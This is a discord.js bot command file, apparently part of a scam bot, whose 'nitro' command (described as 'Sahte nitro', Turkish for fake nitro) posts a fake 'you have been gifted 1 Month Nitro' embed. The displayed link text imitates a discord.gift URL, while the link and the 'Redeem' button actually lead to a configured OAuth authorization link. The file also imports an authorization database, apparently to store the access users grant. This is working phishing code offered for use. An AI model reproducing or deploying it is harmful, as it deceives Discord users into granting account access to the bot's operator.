const { ApplicationCommandType, ApplicationCommandOptionType, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const discord = require("discord.js");
const config = require("../../config.js")
let AuthDB = require(`../../database/AuthDB`)
const { redirect_uri } = require("../../config.js");


module.exports = {
  name: "nitro",
  description: "Sahte nitro",
  options: null,

  type: ApplicationCommandType.ChatInput,
  run: async (client, interaction, args) => {



    let embed1 = new discord.EmbedBuilder()
      .setTitle(`Hey, you have been gifted 1 Month Nitro!`)
      .setDescription(`Congratulations on being selected as a discord event winner!.\n\nHere is your gift, enjoy!\n
[➔ https:/discord.gift/hAzYgzGm3XXr3SHu](${config.oauth_link})`)
    .setImage('https://images-ext-1.discordapp.net/external/at0vWutlNElPTf9ZXuTLF-3dXQYyNNpSeebpITgE9WY/https/gitlab.com/derpystuff/discord-asset-datamining/-/raw/master/lottie/gif/nitro_boost_ios_%286e896200497506ae351b3d12b500a5a8%29.gif')
    .setThumbnail('https://i.imgur.com/tBpj3bo.gif')
    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
      .setLabel("Redeem")
      .setEmoji('<a:gifts:1054103176699191357>')
      .setStyle(ButtonStyle.Link)
      .setURL(`${config.oauth_link}`)
          .setDisabled(false),
      );


    await interaction.reply({
      embeds: [embed1],
      components: [row]

    });

  },
};